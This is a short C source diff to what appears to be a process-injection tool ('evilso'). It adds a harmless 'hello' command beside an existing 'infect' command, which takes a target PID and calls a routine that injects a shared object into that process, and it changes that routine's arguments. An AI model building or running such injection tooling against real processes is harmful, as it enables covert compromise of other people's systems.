@@ -45,12 +45,17 @@
 #include "evilso.h"
 
 static void cmd_infect(int, char *, size_t);
+static void cmd_hello(int, char *, size_t);
 
 cmd_t cmds[] = {
 	{
 		"infect",
 		cmd_infect
 	},
+	{
+		"hello",
+		cmd_hello
+	}
 };
 
 void
@@ -110,7 +115,14 @@ cmd_infect(int s, char *msg, size_t sz)
 	if (sscanf(pidstr, "%d", &pid) != 1)
 		return;
 
-	do_infect(pid, inject, so, targetfunc);
+	do_infect(pid, 0, inject, so, targetfunc);
 
 	return;
+}
+
+static void
+cmd_hello(int s, char *msg, size_t sz)
+{
+
+	printf("Hello command received!\n");
 }
